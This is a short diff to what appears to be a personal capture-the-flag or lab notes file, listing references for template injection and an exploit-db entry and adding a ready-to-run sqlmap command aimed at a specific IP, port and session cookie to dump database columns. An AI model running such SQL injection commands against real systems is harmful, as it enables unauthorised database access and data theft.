@@ -15,3 +15,6 @@ https://0x1.gitlab.io/web-security/Server-Side-Template-Injection/#mako
 
 for unit
 https://www.exploit-db.com/exploits/50702
+
+for sqli
+sqlmap "http://35.198.127.202:31206/" --cookie="PHPSESSID=a597746dc7aefa32c30455fb8294ff78" --random-agent --forms --columns
